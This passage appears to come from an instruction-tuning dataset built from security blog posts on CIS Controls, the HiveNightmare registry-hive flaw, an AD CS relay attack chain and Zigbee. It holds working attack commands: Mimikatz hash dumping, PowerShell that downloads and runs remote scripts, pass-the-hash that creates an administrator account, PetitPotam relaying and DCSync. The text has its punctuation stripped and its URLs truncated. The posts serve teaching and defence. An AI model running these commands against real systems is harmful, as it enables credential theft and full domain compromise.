Multi-Factor Authentication MFA are just a few examples of things you can do to reduce the attack surface on Email and Web Browsers Control 10 Malware Defenses While malware-based attacks have fallen to 7 under the top threat action varieties according to the 2020 Verizon DBIR cybercriminals are still attempting to entice your users to click on links or open attachments containing malware Therefore Malware Defenses are still a critical layer in your overall Defense in Depth Strategy And contrary to popular belief Macs do get viruses so make sure your implementation includes all Windows Mac and Linux-based systems in your environment Control 11 Data Recovery What good are backups if they don't work when you need them Not only is a solid backup strategy important it's crucial that your strategy includes the often overlooked task of performing test restores With ransomware on the rise it's more critical than ever that you're able to successfully restore to a pre-incident state Control 12 Network Infrastructure Management Like the nervous system in the human body the network infrastructure is the backbone of your environment As data is transmitted it traverses through the various components that make up the network infrastructure As such having an accurate network diagram and ensuring that all network devices are running the latest software versions is key Much like Control 1 if network devices or paths exist that you're unaware of then you have a blind spot and can't realistically expect to protect all paths that an adversary could utilize Control 13 Network Monitoring and Defense This control is closely related to Control 12 discussed above Expecting your network defenses to be perfect is unrealistic therefore continuous monitoring of your network infrastructure is crucial in order to monitor for both attacks against the network itself as well as the detection and or prevention of lateral movement Capabilities such as Intrusion Prevention and Intrusion Detection Systems IDS IPS threat hunting and network segmentation are just some examples of controls that will help reduce the impact of a network-based attack Control 14 Security Awareness and Skills Training While it's often stated that users are your weakest link I've never been fond of that statement The fact remains however that the human element is a critical part in the success or failure of an organization's security program It's generally much more difficult to find an exploit than it is to manipulate a user into opening an email attachment and installing malware According to the 2020 Verizon DBIR phishing is the top threat action taken by adversaries to gain access to an environment Why Because it works You change the oil in your car You patch your operating systems So why would you not maintain and patch your users Control 15 Service Provider Management As we rely more and more on vendors and other third parties to manage our data or provide infrastructure for our core applications this is a new and welcome control Therefore a process to ensure these vendors are adequately protecting these platforms and data is crucial With more and more third-party breaches occurring a provider's security and vulnerabilities have direct consequences to your organization Control 16 Application Software Security This is another control that has been extended to include Hosted environments Software applications are the interface that allows users to interact with an application or database As these applications become more and more complex they are rarely created from scratch but rather tend to be assembled from a mixture of new and existing code and libraries Vulnerabilities such as buffer overflows cross-site scripting and command injection are often utilized by adversaries as entry points into our environments This means that our traditional approaches to security are no longer as simple as they once were because the vulnerabilities introduced along with these new complexities are not always sufficiently understood Control 17 Incident Response Management Companies don't usually end up on the front-page news because they were breached but rather because the breach was poorly managed Having an effective Incident Response plan makes all the difference between a small security incident and a full-scale front-page breach An effective program includes protection detection response and recovery capabilities It's unreasonable to think our security protections are going to be effective 100 of the time and statistically speaking a security incident IS going to happen How comprehensive your Incident Response plan is will determine the extent of the damage and whether you're front-page news or just another statistic Control 18 Penetration Testing In today's complex environments with constantly evolving technologies and ever-emerging attacker tradecraft controlled testing of our environments is a crucial but often overlooked component of a well-rounded and comprehensive security program Penetration Testing and Vulnerability Testing are often confused and the terms are often misused interchangeably Vulnerability Testing is just that testing for known vulnerabilities nothing more whereas Penetration Testing takes it further and attempts to exploit these vulnerabilities and misconfigurations of systems with the desired outcome of seeing how far an attacker could get and what business processes or data would be impacted in the event an attacker was able to abuse these vulnerabilities The ultimate goal with Penetration Testing is to discover the vulnerabilities and misconfigurations and then remediate or mitigate them before an attacker does While the aim here was to provide a high-level overview for CIS Controls v8 a more in-depth exploration of the Controls would be a worthwhile investment for any company especially for one looking to improve the maturity of its cybersecurity program A previous study found that by adopting just the first five controls roughly 85 of attacks could be prevented while adopting all of the controls would prevent more than 97 of all attacks So whether you're a small chain of grocery stores a large multi-national bank or somewhere in between if you're looking to bolster your security but don't know where to begin the CIS Controls v8 is an excellent place to start The full details of the Controls are on the Center for Internet Security's website"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What To Know About Microsoft's Registry Hive Flaw: #SeriousSAM</title>\n<taxonomies>General InfoSec Tips & Tricks, Informational, InfoSec 101</taxonomies>\n<creation_date>Fri, 30 Jul 2021 12:32:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "hivenightmare lolwut Jeff McJunkin What is it tl dr Unpatched privilege escalation in Windows 10 in nearly all supported builds The vulnerability CVE-2021 36934 allows an attacker with limited user code execution on Windows 10 or 11 to gain administrative privileges locally allowing any of the following follow-on attacks Stealing credential material for any logged-on users via Mimikatz-style LSASS attacks Dumping and cracking cached domain credentials Persistence on the Windows 10 machine via Silver Ticket attacks What can we do There is no patch from Microsoft but there is an available workaround Due to weak permissions limited users can read registry hive files at the following paths C Windows System32 config SAM C Windows System32 config SYSTEM C Windows System32 config SAM Which versions of Windows 10 are affected Fresh builds of Windows 10 versions 1809 and above appear to be vulnerable though strangely fresh installations of updated Windows 10 20H1 ISO's are an exception How can an attacker take advantage of this flaw An extremely common scenario for initial access is phishing giving an attacker control over an employee's computer whether it's a laptop desktop virtual desktop etc cls Running as limiteduser a fresh account that is not in the Administrators group whoami whoami groups net user limiteduser This system is a fresh installation of Windows 10 1809 the oldest supported Windows 10 build ver Like nearly all such builds it has the permissions flaw of allowing limited users access to registry hives icacls C Windows System32 config SAM findstr Users Set an environment variable pointing to the latest Volume Shadow Copy enabled by default on Windows 10 with system drives 128GB set directory GLOBALROOT Device HarddiskVolumeShadowCopy5 Windows system32 config directory GLOBALROOT Device HarddiskVolumeShadowCopy5 Windows system32 config Point Mimikatz at the VSS backups and filter for the Administrator user and hash Other tools can do this too or an attacker could simply exfiltrate the registry hives and use Mimikatz on their machine mimikatz lsadump sam system directory system sam directory sam exit findstr c User Administrator c 8846 mimikatz.exe lsadump sam system directory system sam directory sam exit findstr c User Administrator c 8846 AMSI is not a defense here or in general msi.fail Set-ExecutionPolicy Bypass -Scope Process -Force System.Net.ServicePointManager SecurityProtocol System.Net.ServicePointManager SecurityProtocol -bor 3072 iex New-Object System.Net.WebClient .DownloadString 'ithub.com Kevin-Robertson Invoke-TheHash raw master Invoke-TheHash.ps1 Set-ExecutionPolicy Bypass -Scope Process -Force System.Net.ServicePointManager SecurityProtocol System.Net.ServicePointManager SecurityProtocol -bor 3072 iex New-Object System.Net.WebClient .DownloadString 'ithub.com Kevin-Robertson Invoke-TheHash raw master Invoke-SMBExec.ps1 Invoke-TheHash -Type SMBExec -Target 127.0.0.1 -Username Administrator -hash 8846f7eaee8fb117ad06bdd830b7586c -Command net user hacker TipYourWaiters add Invoke-TheHash -Type SMBExec -Target 127.0.0.1 -Username Administrator -hash 8846f7eaee8fb117ad06bdd830b7586c -Command net localgroup Administrators hacker add Compare that to the known password of 'password it matches python -c import hashlib binascii print binascii.hexlify hashlib.new 'md4 'password'.encode 'utf-16le .digest icacls C Windows System32 config SAM findstr Users vssadmin list shadows findstr Original FAQ's Does removing the Users group permissions from the registry hives fix the issue No the original permissions will be kept on the Volume Shadow Copy snapshots of the filesystem witter.com wdormann status 1417525453116608512 Does disabling the Volume Shadow Copy service remove all prior snapshots No disabling the Volume Shadow Copy service only removes snapshots made for System Protection purposes witter.com wdormann status 1417547126347808774 Which builds of Windows 10 are vulnerable by default Essentially any Windows 10 starting from build 1809 and above are vulnerable Some later revisions of the Windows 10 1809 ISO's have the correct non-vulnerable permissions however and those permissions are preserved with further Windows updates and upgrades to later builds I would strongly recommend treating all supported Windows 10 builds as vulnerable Source witter.com jeffmcjunkin status 1417281315016122372 and witter.com gentilkiwi status 1417484076550873089 Never Waste A Crisis Start Developing Incident Response Capabilities Velociraptor scales nicely and allows both for sweeping checks for the vulnerability along with actual remediation via Microsoft's workaround Other incident response tools are fine if they have the following minimum capabilities Solution scales to your number of endpoints Allows for fine-grained targeting of threat hunts and actions Supports on-prem cloud-hosted and devices outside the corporate network Thanks to our friend Jeff McJunkin for sharing his knowledge with the Black Hills Information Security BHIS community"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Admin's Nightmare: Combining HiveNightmare/SeriousSAM and AD CS Attack Path's for Profit</title>\n<taxonomies>Author, Blue Team, How-To, Informational, InfoSec 101, Steve Borosh</taxonomies>\n<creation_date>Fri, 06 Aug 2021 12:35:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Stephan Borosh outu.be 7Sj2LY3_O9Y The year of 2021 has presented some interesting challenges to securing Windows and Active Directory environments with new flaws that Microsoft has been slow to address In June Harmj0y and tifkin_ released some excellent research and a whitepaper discussing some potential attack paths with Active Directory Certificate Services AD CS osts.specterops.io certified-pre-owned-d95910965cd2 This was followed by a modified version of impacket ithub.com SecureAuthCorp impacket pull 1101 which provides the ability to relay credentials to an AD CS server and obtain a certificate for the relayed user This certificate may then be re-used elsewhere to authenticate or elevate privileges The following diagram displays a potential attack scenario where a user is phished and the compromised host is used as a pivot point for the AD CS relay attack Example attack graph followed in this blog In an attack scenario an adversary would need to entice a remote user or system to authenticate back to the adversary-controlled host in order to relay the credential to the certificate server The SpoolSample ithub.com leechristensen SpoolSample tool created by tifkin_ provides a method to invoke the MS-RPRN RPC service to entice servers via the Print Spooler to authenticate back to the adversary but the tool requires active directory user credentials A new tool named Petitpotam was released in a tweet by topotam77 witter.com topotam77 status 1416833996923809793 This tool presents a new method for enticing a server or workstation to send a machine account hash back to the adversary By utilizing the MS-EFSRPC protocol ocs.microsoft.com en-us openspecs windows_protocols ms-efsr 08796ba8-01c8-4872-9221-1000ec2eff31 any user on the network may invoke a remote host to send a machine account hash authenticated or not In July 2021 a tweet by jonasLyk witter.com jonasLyk status 1417205166172950531 brought to light a vulnerability that allows any user on a system to read the SAM and SYSTEM registry hives from a shadow copy if present Combined with a utility such as Mimikatz a user could easily obtain the local administrator password hash With this hash the user may be able to Pass-the-Hash and authenticate to the local computer as an administrator For more on this vulnerability check out ww.blackhillsinfosec.com what-to-know-about-microsofts-registry-hive-flaw-serioussam Example Attack Methodology We start by establishing our initial access via Cobalt Strike's beacon agent Next we prep the area of operations by uploading a custom Cobalt Strike launcher and the WinDivert driver packaged with the PortBender utility ithub.com praetorian-inc PortBender In this example we use the directory C Windows Tasks to stage After preparing the environment we can begin our attempt with CVE-2021-36934 We're going to use the tool created by cube0x0's Github ithub.com cube0x0 CVE-2021-36934 We'll use Cobalt-Strike's execute-assembly to run the .NET tool in-memory on our target host We have successfully dumped and parsed the hives and now a few bits of information are presented to us The RID 500 built-in Administrator account has a blank password indicating that it was initially not set In a production environment this would most likely be non-blank or set by Local Administrator Password Solution LAPS We also see some cached domain credentials that could be submitted to a password cracker to attempt to obtain clear text credentials For our case we'll attempt to re-use the RID 1001 account password hash against the administrator account in hopes of a password reuse finding Utilizing the Sharp-SMBExec ithub.com checkymander Sharp-SMBExec tool by checkymander we can attempt to Pass-the-Hash against the local computer attempting to elevate our privileges We execute the command execute-assembly Sharp-SMBExec.exe target localhost hash 2be54de51a5f7b3473ed0c3e1afd07a7 username administrator command cmd.exe c c windows tasks procmon.exe to execute our Cobalt Strike beacon payload as SYSTEM After establishing a new beacon as SYSTEM we can set up our traffic bending In beacon start a reverse port forward with rportfwd 31337 127.0.0.1 445 This will tell the beacon agent to forward any traffic inbound to BENDERPC on port 31337 through the beacon agent back to the team server on port 445 No need to open any firewalls on the team server as this traffic is proxied through the agent Next start PortBender and divert any traffic inbound to port 445 on BENDERPC to port 31337 where the rportfwd is listening We'll need a SOCKS proxy to proxy our relayed traffic back through the agent into the target network With that done we can set up impacket to relay traffic On the Cobalt Strike team server install this ithub.com ExAndroidDev impacket tree ntlmrelayx-adcs-attack updated version of impacket We must clone the repository switch branches git checkout ntlmrelayx-adcs-attack and then install as per impacket instructions We'll also need the PetitPotam ithub.com topotam PetitPotam tool to entice the remote target to send authentication back to us via MS-EFSRPC We'll want to modify the proxychains default DNS server to point to the internal DNS server of our target network Modify the file at usr lib proxychains3 proxyresolv on the team server to point to the internal DNS server as shown in the following example If you need to enumerate the DNS server's IP address from Cobalt Strike you can execute the following command in your beacon agent powerpick System.Net.Dns GetHostEntry domain.local For this attack to work properly we need to provide the Fully Qualified Domain Name FQDN for the certificate server There are a few ways to find the certificate server If you have Remote Desktop access you can issue the command certutil.exe -config -ping to display the certificate server s You may also use a tool such as PowerView to check which groups domain computers belong to A certificate server will belong to the Cert Publishers group In a screen or tmux session we can start ntlmrelayx.py with proxychains python3 ntlmrelayx.py -t rt.planetexpress.local certsrv certfnsh.asp -smb2support --adcs --template domaincontroller With ntlmrelayx.py pointed at the certificate server through our SOCKS proxy we can execute PetitePotam to entice the domain controller to send us its computer hash with proxychains python3 Petitpotam.py 192.168.253.140 192.168.253.135 Petitpotam initiates the authentication We should receive a connection back In Cobalt Strike we see the SMB traffic being forwarded with PortBender Great We now have a valid certificate for the DC01 machine account We can import this into our beacon agent with the Rubeus ithub.com GhostPack Rubeus tool By possessing the domain controller machine account hash we can effectively become the domain controller and perform attacks such as DCSync Back in a Cobalt Strike beacon agent elevation not required we execute Rubeus to pass the ticket into the session and become DC01 execute-assembly home rvrsh3ll tools Rubeus.exe asktgt user DC01 certificate MII ptt Now we've successfully become the domain controller we can perform a DCSYNC attack from Cobalt Strike Conclusion To recap we started from an initial beacon agent abused CVE-2021-36934 to escalate local privileges diverted port 445 to our team server enticed the domain controller to authenticate to us relayed those credentials to the certificate server received an authentication certificate imported that into our beacon agent via Rubeus and DCSYNC'd the domain controller for the win Combining these two attacks provide adversaries with a quick way to take over an Active Directory environment Microsoft has issued mitigations for CVE-2021-36934 at src.microsoft.com update-guide vulnerability CVE-2021-36934 Regarding AD CS you can check out the fantastic post by SpecterOps osts.specterops.io certified-pre-owned-d95910965cd2 and PKI auditing tool at ithub.com GhostPack PSPKIAudit"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Understanding Zigbee and Wireless Mesh Networking</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch, Wireless</taxonomies>\n<creation_date>Fri, 27 Aug 2021 17:34:05 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Preface Recently I acquired a few home automation devices so that I might research Zigbee and get a better understanding of how this very popular wireless technology interconnects with the internet of things IoT's and to determine just how secure this platform really is I was already somewhat familiar with home automation in regard to using the Bluetooth Low Energy BLE Mesh topology However major advances have been made with IoT devices including but not limited to connecting very low power devices in many cases battery-powered and lasting for years low data rates 20-250Kbits sec providing for more reliable communications and self-forming and self-healing networks that grow as your needs grow The following document outlines my research of the Zigbee protocol and its mesh topology as it applies to small and large-scale automation Hopefully others might benefit from the information that I discovered along the way Useful Hardware Preliminary preparation for my research into the Zigbee protocol consisted of getting familiar with some of the existing hardware available for analyzing and interacting with the Zigbee network It didn't take long to find out that a very popular Zigbee sniffer was the RZRaven USB Sniffer which came with RiverLoop Security's Killerbee framework ithub.com riverloopsec killerbee pre-installed selling for around 100 Unfortunately after exhaustive searching I discovered that the RZRaven has been discontinued and is nowhere to be found Reaching out to the community I learned that another dongle existed known as the ApiMote and it also came pre-installed with the Killerbee framework I also found out that it was available through the Attify Store ww.attify-store.com products apimote-for-zigbee-sniffing-and-transmission for 149 This transceiver dongle is also capable of packet injection Other Zigbee sniffers considered were Nordic's nRF52840 ww.mouser.com new nordic-semiconductor nordic-nrf52840-usb-dongle and the Texas Instruments CC2531 ww.ti.com tool PACKET-SNIFFER The TI CC2531 option also comes with an impressive GUI software application for dissecting and displaying the captured packets I decided to go with the Api-Mote Killerbee dongle as well as the very inexpensive Texas Instruments CC2531 USB dongle cost under 10 Why Zigbee Some may ask Why Zigbee We already have Wi-Fi and Bluetooth short-range communication standards that provide greater range and support higher data rates While it is true that greater range and higher data rates allow for superb streaming video using Wi-Fi and to a lesser degree audio streaming using Bluetooth the requirements for Zigbee control and sensor networks are far less demanding Technically speaking that is exactly why Zigbee is the better choice as control and sensor network nodes are typically less than a few meters apart from each other so range is hardly an issue And communication between nodes can be established using very small packet sizes thereby allowing very low data rates 20-250 kbps Lower data rates and close proximity nodes yield more reliable communications fewer retries etc and work well with low power battery-operated end-point devices keeping costs down dramatically as the network continues to grow in size Background Information Zigbee is an open standard wireless technology designed to facilitate low-cost low-power wireless internet of things IoT networks Specifically Zigbee is a low-cost low-power self-forming self-healing wireless mesh network standard solution aimed at providing wireless control and monitoring applications with an emphasis on supporting battery-powered low data rate devices This protocol is typically used in home automation HA and commercial building automation industrial control systems and the medical health care industries Zigbee integrated circuits IC's encompass microcontrollers and radios operating in the unlicensed ISM industrial scientific and medical bands 2.4GHz for the majority of areas worldwide There are a few devices using sub-GHz 745MHz in China 878MHz in Europe and 915MHz in the United States and Australia but this is generally the exception to the rule Zigbee uses 16 channels 11-26 2 MHz wide with 5 MHz separation in the 2.4GHz ISM band It should be noted that when a Zigbee network is first formed the coordinator hub will scan the available channels and select the best channel to operate on least RF interference and only that one channel will be used going forward no channel hopping Zigbee is an IEEE 802.15.4-based wireless networking standard which is basically used for two-way communication between sensors and control systems Zigbee is a short-range wireless communication standard like Bluetooth and Wi-Fi while covering a range of 10 to 100 meters By creating a network of devices that can communicate with each other in a mesh network the 10 to 100-meter range can be extended significantly making it extremely useful in commercial lighting and industrial control automation applications New devices nodes can easily join the network with a theoretical maximum limit of 65 000 nodes Rerouting of communication traffic due to failed nodes provides a form of self-healing for the network Zigbee endpoint devices lights plugs sensors switches thermostats etc are extremely low-power and can last years on tiny batteries Also the fact that Zigbee is based on an open standard assures consumers and developers that devices will interoperate Brief History Zigbee has been around for a long time initially conceived in the 1990s The IEEE 802.15.4-2003 specification was ratified in 2004 and was made available the following year known as the Zigbee 2004 Specification In 2006 an upgraded specification was introduced as Zigbee 2006 Specification replacing the 'key-value pair structure of the 2004 stack with the Zigbee Cluster Library ZCL This library is composed of standardized commands and attributes organized under groups clusters with such names as Smart Energy Home Automation Zigbee Light Link etc In 2007 Zigbee Pro was introduced always maintaining backwards compatibility with the Zigbee legacy networks Zigbee Pro devices can join legacy networks and legacy devices can join Zigbee Pro networks However routing options differed which resulted in a condition that Zigbee Pro devices must become non-routing Zigbee end devices ZEDs when on a legacy network and legacy Zigbee devices must become ZEDs on a Zigbee Pro network According to the German computer e-magazine Heise Online Zigbee Home Automation 1.2 2013 is using fallback keys for encryption negotiation which are known and cannot be changed This makes the encryption on many legacy devices highly vulnerable Fun fact Back then the well-known default global trust center link key defined by the ZigBee Alliance had a default value of 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39 ZigBeeAlliance09 and was used or supported by the device if no other link key is specified by the application at the time of joining Note Zigbee 3.0 going forward silently ignores the request to join the network if a device attempts to authenticate using the well-known 'ZigBeeAlliance09 trust center link key Zigbee Development Platforms EmberZNet is the implementation of Zigbee by Silicon Labs It consists of the core Zigbee stack Zigbee Cluster Library support and an Application Framework With the aid of AppBuilder in Simplicity Studio developers can easily create a Zigbee application that can be run on one of Silicon Labs development kits Z-Stack is a component of the SimpleLink CC13x2 CC26x2 Software Development Kit This component enables development of Zigbee 3.0 specification-based products Z-Stack is TI's complete solution for developing certified Zigbee 3.0 solutions on CC13x2 and CC26x2 platforms Zigbee Alliance The Zigbee Alliance board of directors is comprised of executives from Amazon Apple Comcast Google IKEA The Kroger Co LEEDARSON Legrand Lutron Electronics MMB Networks NXP Semiconductors Resideo Schneider Electric Signify formerly Philips Lighting Silicon Labs SmartThings Somfy Texas Instruments and Wulian Established in 2002 the Zigbee Alliance is a group of more than 500 companies that maintain and publish the Zigbee standard The organization publishes application profiles that allow multiple OEM vendors to create interoperable products The relationship between IEEE 802.15.4 and Zigbee is similar to that between IEEE 802.11 and the Wi-Fi Alliance As of May 11 2021 the Zigbee Alliance has been rebranded to Connectivity Standards Alliance CSA TECHNICAL INFORMATION Zigbee Devices Types Zigbee Coordinator ZC Zigbee Router ZR Zigbee Endpoint Device ZED The Zigbee network has exactly one Zigbee Coordinator ZC responsible for forming and coordinating the network Forming includes choosing the PAN ID personal area network identification to identify the network and determining the physical radio channel to operate on The coordinator is also responsible for configuring and authenticating routers and end devices that join the network The coordinator is the Trust Center and stores all critical information about the Zigbee network including encryption keys and link keys The Zigbee Router ZR represents intermediate nodes to assist in the relaying of data between nodes in the network They are instrumental in the building of the Zigbee network where packets are exchanged The Zigbee routers enhance the mesh network by increasing the range of the network relaying packets throughout the mesh network increasing the reliability of the packets being exchanged and providing a means for additional nodes to join the network with the help of the coordinator A good example of Zigbee Router might be a smart plug powered by a wall outlet This device has an endless supply of main power and is therefore always on The fact that this smart plug is a full-function device FFD makes it ideal for routing traffic and a strong candidate for becoming a parent to reduced functioning RFD endpoint devices The Zigbee Endpoint Device ZED are nodes that are logically attached to a Zigbee Router ZR and are typically devices such as lights plugs sensors switches thermostats etc and communicate only with the Zigbee Router parent that they are related to ZED's are often battery-powered devices and sleep most of the time They cannot communicate with other Zigbee Endpoint Devices ZEDs directly In this sense ZED's are considered Reduced Function Devices RFD's ZED's have lower power requirements due to active sleep mode and can achieve long lifetimes on batteries In contrast ZR's and ZC's which are always awake have high power requirements and for this reason cannot be battery powered ZED's are typically off sleep mode most of the time thus not able to receive any traffic sent to them in real-time Periodically they wake up and check for messages by querying their parent router ZR that they are logically connected to Note The router buffers the data intended for the ZED child and sends that data only when polled by the ZED on wake up Wake-up times are defined by the application developer NOT the Zigbee specification ZED's can immediately communicate with their parent router on wake up because ZR's are always awake Zigbee Stack PHYSICAL Layer The Physical layer includes the interface of the physical radio and MAC layer radio on off control modulation and demodulation channel selection link quality estimation and energy detection Zigbee radios share the 2.4 GHz ISM band with Wi-Fi and using 16 channels 11-26 2 MHz wide with 5 MHz carrier separation between channels MAC Layer In the MAC header there is a 2-byte field Frame Control Bit 0-2 indicating the frame type Typically there are four frame types Beacon used to scan networks Data used to transmit data from higher layers ACK acknowledgement MAC Command control commands of MAC layer like MAC association procedure At the end of each MAC frame there are two bytes CRC used to verify the integrity of the packet NETWORK Layer The Network layer is located between the MAC layer and the application support sub-layer APS and is where the network management takes place The Network layer takes care of the network structure routing and security Device Types IEEE-802.15.4 defines two network device types FFD Full Functional Device capable of performing all the duties described in the IEEE 802.15.4 standard and can accept any role in the network RFD Reduced Functional Device generally battery-powered has limited capabilities Note The processing power and memory size of RFD devices are normally less than those of FFD devices In Zigbee there are three physical device types Coordinator forms the network has routing capability is powered by main must always stay awake can be a parent There can only be one coordinator per network Coordinators node ID is always 0000 Router cannot form the network has routing capability is powered by main must always stay awake can be a parent End Device cannot form the network does not have routing capability is powered by main or battery must have a parent End device can be non-sleep end device or sleep end device Network Address Zigbee uses PAN ID and extended PAN ID to identify a network PAN ID is a 16-bit identifier that all nodes in the PAN Personal Area Network will share The PAN ID is chosen by the coordinator upon forming the network and is used to distinguish it from other nearby networks that may happen to be on the same channel Extended PAN ID is a fallback network identifier known by all nodes in the PAN The normal short PAN ID is transmitted in 'over the air packets as it is quicker to send 16 bits versus 64 bits The extended PAN ID is also unique for every PAN and is chosen by the coordinator upon forming the network However the extended PAN ID is seldom transmitted over the air and is used more as a backup criteria in case PAN ID conflicts were to arise Using the extended PAN ID would allow the coordinator to talk to all nodes and establish a new PAN ID to move to and resolve the issue The extended PAN ID is only sent over the air in response to an active scan new nodes requesting to join the network and when a rare PAN ID update is occurring Device Node Address Like the Network address each node in the network has a unique short and long address to distinguish it from the other nodes in the network The long address is the 64-bit IEEE assigned MAC address EUI-64 and is a globally unique ID GUID that is generally assigned during the manufacturing stage Being a globally unique ID means that no two IEEE radios in the world will have the same GUID As is the case with the extended Network address the long EUI-64 address is seldom sent over the air except for join Beacon requests and or to resolve rare node address conflicts The short address 16-bit assigned by the coordinator when the node joins the network is used over the air Known as the Node ID this address is unique to its home PAN network APPLICATION Layer The ZigBee Application layer is called application framework AF and runs on top of the Application support layer APS The AF supports many applications and processes incoming data between registered applications Some registered applications are defined within the Zigbee specification while others are vendor implementations Zigbee defines an application as a profile ZigBee profiles are identified with an integer between 0 and 240 called an endpoint There are two types of application profiles public and vendor-specific A special profile with an endpoint ID of zero is the ZDO Zigbee device object and it is used for network configuration and setup The Zigbee Alliance has defined a few profiles such as Smart Energy Home Automation Commercial Building Automation Toys etc Device endpoints versus Logical endpoints A logical endpoint ID is an 8-bit value ranging from 0 to 255 Endpoint 0 is reserved for Zigbee Device Object ZDO used for network management purposes Endpoint 1 to 239 can be used by user applications Endpoint 240 to 254 are reserved for special applications Endpoint 255 is used for broadcasting Broadcast Addresses Applications register with an endpoint identifier at the AF layer When the AF layer processes an incoming message it is passed on to the appropriate cluster for handling based on the endpoint identifier If a packet arrives for an endpoint identifier that is not registered the packet is silently dropped Endpoints are logical extensions defined in the application layer that can be thought of as devices accessible through a single ZigBee radio node For example a light switch attached to a radio node might be one endpoint physical and a dimmer attached to the same node might be another endpoint logical rather than a completely new application see figure 1 In another example a smart outlet strip attached to a radio node might be an endpoint physical and each outlet on the strip attached to the same node might be other endpoints see figure 2 CLUSTERS Zigbee clusters are based on a client server model and are used to implement an application protocol between two or more devices Clusters are a group of commands and attributes that define what a device can do a group of actions by function Each cluster is assigned a cluster ID which is defined in the Zigbee Cluster Library ZCL A cluster may be defined with several attributes and commands A cluster in the ZigBee Cluster Library is an object containing both methods commands and data attributes Binding is an action in ZigBee which defines relations between two devices specific endpoints and cluster ID It provides a mechanism for attaching an endpoint on one node to one or more endpoints on another node and can even be applied to groups of nodes SECURITY Security within the Zigbee network is based on a network key and link keys Unicast communication between any two application layer devices is secured using a 128-bit link key shared by the two devices while broadcast communications are secured by a 128-bit network key shared among ALL devices in the network The intended recipient s of the communication is always aware of the precise security arrangement by that the recipient knows whether the frame is protected with a link key or a network key NETWORK Key Zigbee network security uses a network-wide key for encryption and decryption The network key is a 128-bit key shared by all devices in the network Normally it's randomly generated by the coordinator when the network is formed When new devices join the network they must get a copy of the network key TRUST CENTER Networks In a Zigbee network the role of who distributes a network key to new devices is called the trust center TC There are two security models centralized security network and distributed security network In a centralized security network there is only one trust center and it's the coordinator All new devices will get the network key from the coordinator In a distributed security network no coordinator device each router is a trust center New devices can get the network key from any router as any router can authorize and authenticate new devices that wish to join Note The decision to use a Distributed Trust Center Network or a Trust Center Network is done at the time the network is formed There is no way to change this decision after the network has been started All devices that are authorized to join the network have a copy of the key and use it to encrypt and decrypt all network messages The network key also has a sequence number associated with it to identify a particular instance of the key Occasionally when the network key is updated the sequence number is incremented to allow devices to identify which instance of the network key has been used to secure the packet data The sequence number ranges from 0 to 255 When the sequence number reaches 255 it wraps back to 0 All devices that are part of a secured Zigbee network have a copy of the network key As the network key needs to be transported from one device to another the key value needs to be encrypted during transport This encryption is done in the application layer NETWORK Layer Security Packet Security A packet secured at the network layer is composed of the following elements see below Auxiliary Security Header The auxiliary header contains data about the security of the packet that a receiving node uses to correctly authenticate and decrypt the packet This data includes the type of key used the sequence number if it is the network key the IEEE long address of the device that secured the data and the frame counter Authentication and Encryption Zigbee uses a 128-bit symmetric key to encrypt all transmissions at the network layer The network and auxiliary headers are sent in the clear but authenticated while the network payload is authenticated and encrypted AES-128 is used to create a hash of the entire network portion of the message security header and payload which is appended to the end of the message This hash is known as the Message Integrity Code MIC and is used to authenticate the message by ensuring it has not been modified A receiving device hashes the message and verifies the calculated MIC against the value appended to the message Alterations to the message invalidate the MIC and the receiving node will silently discard the message Note Zigbee presently uses a 4-byte MIC Message Integrity Code MIC The nonce see figure 3 used in the AES-CCM encryption process is a 13-octet string constructed using the security control field the frame counter and the source address fields of the Zigbee security header The size of the MIC can be 32 bits 64 bits or 128 bits 32 bits in the following example The following screenshot see figure 4 shows the Zigbee Network Layer and Zigbee Security Header sections of a Broadcast packet sent by my Smart Plug 1 Network Security Frame Counter A frame counter is included in the auxiliary headers as a means of protecting against replay attacks All devices have their own unique outgoing frame counter and they maintain a list of their neighbors and children's frame counters Every time a device sends a packet it increments its outgoing frame counter All normal network communication is required to have network security and a valid frame counter The only exception is during joining when devices do not yet have the network key In that case a joining device's messages are relayed through its parent until it is fully joined and authenticated Any other messages that are received without network layer security are silently discarded A receiving device verifies that the frame counter of the sending device has increased from the last value that it saw If it has not increased the packet is silently discarded If the receiving device is not the final destination the packet is decrypted and modified to include the routing device's frame counter The packet is then re-encrypted and sent along to the next hop known as hop-by-hop security The frame counter is 32 bits and may not wrap to zero The network key can be updated before the frame counter reaches its maximum value When that occurs the frame counter may be reset to zero if the local device's value is above 0x80000000 APPLICATION SUPPORT LAYER APS SECURITY End-to-End Security APS security is intended to provide a way to send messages securely within a Zigbee network such that no other device can decrypt the data except the source and destination This is different from network security which provides only hop-by-hop security In that case every device that is part of the network hears the packet being sent to its destination and decrypts it APS security uses a shared key link key that only the source and destination know about thus providing end-to-end security Both APS layer and network layer encryption can be used simultaneously to encrypt the contents of a message In that case the APS layer security is applied first and then the network layer security A packet secured at the APS layer is composed of the following elements see below LINK Keys APS 